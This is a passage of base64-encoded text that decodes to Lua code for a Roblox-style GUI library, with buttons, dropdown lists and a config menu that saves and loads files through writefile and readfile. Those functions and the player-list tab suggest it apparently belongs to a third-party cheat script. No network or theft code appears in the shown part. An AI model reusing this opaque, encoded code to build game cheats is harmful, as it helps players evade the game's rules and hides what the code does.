5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJidXR0b24iIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDMpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YWTsKICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAibmFtZSIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7ICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBpdGVtc1sgImJ1dHRvbiIgXS5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGNmZy5jYWxsYmFjaygpCgogICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdLlRleHRDb2xvcjMgPSB0aGVtZXMucHJlc2V0LmFjY2VudCAKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJuYW1lIiBdLCB7VGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KX0pCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpzZXR0aW5ncyhvcHRpb25zKSAgCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsKICAgICAgICAgICAgICAgIG9wZW4gPSBmYWxzZTsgCiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OyAKICAgICAgICAgICAgICAgIHNhbml0eSA9IHRydWU7IC0tIG1hZGUgdGhpcyBmb3IgbXkgb3duIHNhbml0eS4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgbG9jYWwgaXRlbXMgPSBjZmcuaXRlbXM7IGRvIAogICAgICAgICAgICAgICAgaXRlbXNbICJvdXRsaW5lIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgVmlzaWJsZSA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGlicmFyeVsgIml0ZW1zIiBdOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBDbGlwc0Rlc2NlbmRhbnRzID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1LCAyNSwgMjkpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJpbmxpbmUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm91dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEsIDAsIDEpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMiwgMSwgLTIpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyMiwgMjIsIDI0KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5saW5lIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA3KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiZWxlbWVudHMiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEwLCAwLCAxMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTIwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUxpc3RMYXlvdXQiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZyA9IGRpbSgwLCAxMCk7CiAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0JvdHRvbSA9IGRpbSgwLCAxNSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJlbGVtZW50cyIgXQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImZhZGUiIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDcpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJ0aWNrIiBdID0gbGlicmFyeTpjcmVhdGUoICJJbWFnZUJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzEyODc5NzIwMDQ0MjY5OCI7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZi5pdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDE2LCAwLCAxNik7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXRfdmlzaWJsZShib29sKSAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAib3V0bGluZSIgXSwge1NpemUgPSBkaW1fb2Zmc2V0KGJvb2wgYW5kIDI0MCBvciAwLCAwKX0pCiAgICAgICAgICAgICAgICBpdGVtc1sgIm91dGxpbmUiIF0uUG9zaXRpb24gPSBkaW1fb2Zmc2V0KGl0ZW1zWyAidGljayIgXS5BYnNvbHV0ZVBvc2l0aW9uLlgsIGl0ZW1zWyAidGljayIgXS5BYnNvbHV0ZVBvc2l0aW9uLlkgKyA5MCkKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y2xvc2VfZWxlbWVudChjZmcpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaXRlbXNbICJ0aWNrIiBdLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgY2ZnLm9wZW4gPSBub3QgY2ZnLm9wZW4KCiAgICAgICAgICAgICAgICBjZmcuc2V0X3Zpc2libGUoY2ZnLm9wZW4pCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpsaXN0KHByb3BlcnRpZXMpIAogICAgICAgICAgICBsb2NhbCBjZmcgPSB7CiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwogICAgICAgICAgICAgICAgb3B0aW9ucyA9IHByb3BlcnRpZXMub3B0aW9ucyBvciB7IjEiLCAiMiIsICIzIn07CiAgICAgICAgICAgICAgICBmbGFnID0gcHJvcGVydGllcy5mbGFnIG9yIGxpYnJhcnk6bmV4dF9mbGFnKCk7ICAgIAogICAgICAgICAgICAgICAgY2FsbGJhY2sgPSBwcm9wZXJ0aWVzLmNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kOwogICAgICAgICAgICAgICAgZGF0YV9zdG9yZSA9IHt9OyAgICAgICAgCiAgICAgICAgICAgICAgICBjdXJyZW50X2VsZW1lbnQ7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbwogICAgICAgICAgICAgICAgaXRlbXNbICJsaXN0IiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZi5pdGVtc1sgImVsZW1lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImxpc3QiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZyA9IGRpbSgwLCAxMCk7CiAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJsaXN0IiBdOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdSaWdodCA9IGRpbSgwLCA0KTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5yZWZyZXNoX29wdGlvbnMob3B0aW9uc190b19yZWZyZXNoKQogICAgICAgICAgICAgICAgbG9jYWwgb2xkX3NlbGVjdGVkX3ZhbHVlID0gZmxhZ3NbY2ZnLmZsYWddIC0tIHN0b3JlIGN1cnJlbnQgc2VsZWN0ZWQgb3B0aW9uIHN0cmluZwogICAgICAgICAgICAgICAgY2ZnLmN1cnJlbnRfZWxlbWVudCA9IG5pbCAtLSByZXNldCBjdXJyZW50IFVJIGVsZW1lbnQKICAgICAgICAgICAgICAgIGZvciBfLCBvcHRpb24gaW4gY2ZnLmRhdGFfc3RvcmUgZG8gCiAgICAgICAgICAgICAgICAgICAgb3B0aW9uOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBjZmcuZGF0YV9zdG9yZSA9IHt9CgogICAgICAgICAgICAgICAgZm9yIF8sIG9wdGlvbl9kYXRhIGluIG9wdGlvbnNfdG9fcmVmcmVzaCBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIGJ1dHRvbiA9IGxpYnJhcnk6Y3JlYXRlKCJUZXh0QnV0dG9uIiwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbImxpc3QiXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMzApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDMzLCAzMywgMzUpCiAgICAgICAgICAgICAgICAgICAgfSk7IGNmZy5kYXRhX3N0b3JlWyNjZmcuZGF0YV9zdG9yZSArIDFdID0gYnV0dG9uOwoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBuYW1lID0gbGlicmFyeTpjcmVhdGUoIlRleHRMYWJlbCIsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzMpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSBvcHRpb25fZGF0YTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gYnV0dG9uOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCJVSUNvcm5lciIsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gYnV0dG9uOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgMykKICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgLS0gQXBwbHkgc2VsZWN0aW9uIGhpZ2hsaWdodCBpZiB0aGlzIGlzIHRoZSBvbGQgc2VsZWN0ZWQgb3B0aW9uCiAgICAgICAgICAgICAgICAgICAgaWYgb3B0aW9uX2RhdGEgPT0gb2xkX3NlbGVjdGVkX3ZhbHVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihuYW1lLCB7VGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KX0pCiAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5jdXJyZW50X2VsZW1lbnQgPSBuYW1lCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY3VycmVudCA9IGNmZy5jdXJyZW50X2VsZW1lbnQgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGN1cnJlbnQgYW5kIGN1cnJlbnQgfj0gbmFtZSB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihjdXJyZW50LCB7VGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDcyKX0pCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gb3B0aW9uX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLmNhbGxiYWNrKG9wdGlvbl9kYXRhKQogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKG5hbWUsIHtUZXh0Q29sb3IzID0gcmdiKDI0NSwgMjQ1LCAyNDUpfSkKICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLmN1cnJlbnRfZWxlbWVudCA9IG5hbWUKICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgIG5hbWUuTW91c2VFbnRlcjpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2ZnLmN1cnJlbnRfZWxlbWVudCA9PSBuYW1lIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKG5hbWUsIHtUZXh0Q29sb3IzID0gcmdiKDE0MCwgMTQwLCAxNDApfSkKICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgIG5hbWUuTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2ZnLmN1cnJlbnRfZWxlbWVudCA9PSBuYW1lIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKG5hbWUsIHtUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzIpfSkKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgoKICAgICAgICAgICAgY2ZnLnJlZnJlc2hfb3B0aW9ucyhjZmcub3B0aW9ucykKCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZCAKCiAgICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OmluaXRfY29uZmlnKHdpbmRvdykgCiAgICAgICAgICAgIC0td2luZG93OnNlcGVyYXRvcih7bmFtZSA9ICJTZXR0aW5ncyJ9KQogICAgICAgICAgICBsb2NhbCBtYWluLCBwbGF5ZXJsaXN0ID0gd2luZG93OnRhYih7bmFtZSA9ICJDb25maWdzIiwgdGFicyA9IHsiTWFpbiIsICJQbGF5ZXJsaXN0In19KSBkbwogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgY29sdW1uID0gbWFpbjpjb2x1bW4oe30pCiAgICAgICAgICAgIGxvY2FsIHNlY3Rpb24gPSBjb2x1bW46c2VjdGlvbih7bmFtZSA9ICJDb25maWdzIiwgc2l6ZSA9IDEsIGRlZmF1bHQgPSBmYWxzZSwgaWNvbiA9ICJyYnhhc3NldGlkOi8vMTM5NjI4MjAyNTc2NTExIn0pCiAgICAgICAgICAgIGNvbmZpZ19ob2xkZXIgPSBzZWN0aW9uOmxpc3Qoe29wdGlvbnMgPSB7IlJlcG9ydCIsICJUaGlzIiwgIkVycm9yIiwgIlRvIiwgIkZpbm9iZSJ9LCBjYWxsYmFjayA9IGZ1bmN0aW9uKG9wdGlvbikgZW5kLCBmbGFnID0gImNvbmZpZ19uYW1lX2xpc3QifSk7IGxpYnJhcnk6dXBkYXRlX2NvbmZpZ19saXN0KCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGNvbHVtbiA9IG1haW46Y29sdW1uKHt9KQogICAgICAgICAgICBsb2NhbCBzZWN0aW9uID0gY29sdW1uOnNlY3Rpb24oe25hbWUgPSAiU2V0dGluZ3MiLCBzaWRlID0gInJpZ2h0Iiwgc2l6ZSA9IDEsIGRlZmF1bHQgPSBmYWxzZSwgaWNvbiA9IEdldEltYWdlKCJTZXR0aW5ncy5wbmciKX0pCiAgICAgICAgICAgIHNlY3Rpb246dGV4dGJveCh7bmFtZSA9ICJDb25maWcgbmFtZToiLCBmbGFnID0gImNvbmZpZ19uYW1lX3RleHQifSkKICAgICAgICAgICAgc2VjdGlvbjpidXR0b24oewogICAgICAgICAgICAgICAgbmFtZSA9ICJTYXZlIiwKICAgICAgICAgICAgICAgIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29uZmlnX25hbWUgPSAoZmxhZ3NbImNvbmZpZ19uYW1lX3RleHQiXSkKICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVmaWxlKGxpYnJhcnkuZGlyZWN0b3J5IC4uICIvY29uZmlncy8iIC4uIGNvbmZpZ19uYW1lIC4uICIuY2ZnIiwgbGlicmFyeTpnZXRfY29uZmlnKCkpCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dXBkYXRlX2NvbmZpZ19saXN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgbm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiQ29uZmlncyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvID0gIlNhdmVkIGNvbmZpZyB0bzpcbiIgLi4gY29uZmlnX25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgfSkKCiAgICAgICAgICAgIHNlY3Rpb246YnV0dG9uKHsKICAgICAgICAgICAgICAgIG5hbWUgPSAiT3ZlcndyaXRlIiwKICAgICAgICAgICAgICAgIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29uZmlnX25hbWUgPSAoZmxhZ3NbImNvbmZpZ19uYW1lX2xpc3QiXSkKICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVmaWxlKGxpYnJhcnkuZGlyZWN0b3J5IC4uICIvY29uZmlncy8iIC4uIGNvbmZpZ19uYW1lIC4uICIuY2ZnIiwgbGlicmFyeTpnZXRfY29uZmlnKCkpCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dXBkYXRlX2NvbmZpZ19saXN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgbm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiQ29uZmlncyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvID0gIk92ZXJ3cm90ZSBjb25maWcgOlxuIiAuLiBjb25maWdfbmFtZQogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICB9KQoKICAgICAgICAgICAgc2VjdGlvbjpidXR0b24oewogICAgICAgICAgICAgICAgbmFtZSA9ICJMb2FkIiwKICAgICAgICAgICAgICAgIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29uZmlnX25hbWUgPSBmbGFnc1siY29uZmlnX25hbWVfbGlzdCJdCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6bG9hZF9jb25maWcocmVhZGZpbGUobGlicmFyeS5kaXJlY3RvcnkgLi4gIi9jb25maWdzLyIgLi4gY29uZmlnX25hbWUgLi4gIi5jZmciKSkKICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp1cGRhdGVfY29uZmlnX2xpc3QoKQogICAgICAgICAgICAgICAgICAgICAgICBub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJDb25maWdzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSAiTG9hZGVkIGNvbmZpZzpcbiIgLi4gY29uZmlnX25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgfSkKCiAgICAgICAgICAgIHNlY3Rpb246YnV0dG9uKHsKICAgICAgICAgICAgICAgIG5hbWUgPSAiRGVsZXRlIiwKICAgICAgICAgICAgICAgIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICA